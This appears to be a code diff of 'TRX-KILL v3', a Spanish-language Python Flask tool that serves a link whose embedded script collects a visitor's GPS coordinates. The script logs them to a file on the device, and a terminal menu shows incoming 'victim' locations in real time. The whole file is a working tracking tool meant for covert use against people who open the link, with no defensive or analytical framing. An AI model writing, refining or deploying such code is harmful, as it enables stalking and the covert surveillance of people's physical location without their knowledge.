@@ -1,20 +1,15 @@
-import os, sys, time, threading
+import os, sys, threading, time
 from flask import Flask, request
 
-# Configuración
-STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
-LOG_FILE = f"{STORAGE_PATH}/result.txt"
-B, C, W = "\033[1;34m", "\033[1;36m", "\033[0m"
+# --- CONFIG ---
+LOG_FILE = "/sdcard/TRX-KILL-RESUL/result.txt"
+if not os.path.exists("/sdcard/TRX-KILL-RESUL"): os.makedirs("/sdcard/TRX-KILL-RESUL")
 
-if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
-
-app1 = Flask('SRV-1')
-app2 = Flask('SRV-2')
+app = Flask('TRX-KILL')
 logging = __import__('logging')
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
 
-@app1.route('/')
-@app2.route('/')
+@app.route('/')
 def index():
     return """<html><body><script>
         navigator.geolocation.getCurrentPosition(pos => {
@@ -23,53 +18,42 @@ def index():
         });
     </script></html>"""
 
-@app1.route('/log')
-@app2.route('/log')
+@app.route('/log')
 def log():
-    lat = request.args.get('lat')
-    lon = request.args.get('lon')
     with open(LOG_FILE, "a") as f:
-        f.write(f"GPS: {lat},{lon}\n")
+        f.write(f"GPS: {request.args.get('lat')},{request.args.get('lon')}\n")
     return "OK"
 
 def main():
-    # Limpieza total antes de iniciar
+    # 1. Limpieza total de puertos
     os.system("fuser -k 5000/tcp 8080/tcp > /dev/null 2>&1")
     
-    # Arrancar dos servidores en puertos distintos
-    threading.Thread(target=lambda: app1.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
-    threading.Thread(target=lambda: app2.run(host='0.0.0.0', port=8080, debug=False), daemon=True).start()
+    # 2. Servidor en segundo plano
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
     
+    # 3. Interfaz
     while True:
         os.system('clear')
-        print(f"{B}####################################")
-        print(f"{C}#    TRX-KILL v3.0 | MODO DUAL     #")
-        print(f"{B}####################################{W}\n")
-        print(f"{C}[01] RASTREAR | [02] LINK-MONITOR | [00] SALIR{W}")
-        sel = input(f"\n{B}TRX-ROOT > {W}")
+        print("--- TRX-KILL V3 (MONITOR ACTIVO) ---")
+        print("[1] INICIAR MONITOR EN TIEMPO REAL")
+        print("[2] SALIR")
+        op = input("\nTRX-ROOT > ")
 
-        if sel == "02":
+        if op == "1":
             os.system('clear')
-            print(f"{C}--- MONITOR DE PUERTOS (5000 y 8080) ---{W}")
-            print(f"Link 1: http://localhost:5000")
-            print(f"Link 2: http://localhost:8080")
-            print(f"{B}ESPERANDO VÍCTIMA... (No presiones nada, los datos aparecerán solos){W}")
-            
-            # Bucle de monitoreo puro (sin input que bloquee)
+            print("ESPERANDO DATOS... (PARA VOLVER, PRESIONA ENTER MUCHAS VECES)")
+            # Monitor puro: solo lee el archivo
             while True:
-                time.sleep(2)
+                time.sleep(1)
                 if os.path.exists(LOG_FILE):
                     with open(LOG_FILE, 'r') as f:
-                        lines = f.readlines()
-                        if lines:
-                            os.system('clear')
-                            print(f"{C}¡DATOS RECIBIDOS EN TIEMPO REAL!{W}\n")
-                            # Muestra las últimas 5 capturas
-                            for l in lines[-5:]:
-                                print(f"{B}{l.strip()}{W}")
-        
-        elif sel == "00": 
-            os.system("fuser -k 5000/tcp 8080/tcp")
+                        contenido = f.read()
+                        os.system('clear')
+                        print("--- DATOS RECIBIDOS ---")
+                        print(contenido)
+                        print("\n(Presiona Enter repetidas veces para salir)")
+        elif op == "2":
+            os.system("fuser -k 5000/tcp")
             sys.exit()
 
 if __name__ == "__main__": main()
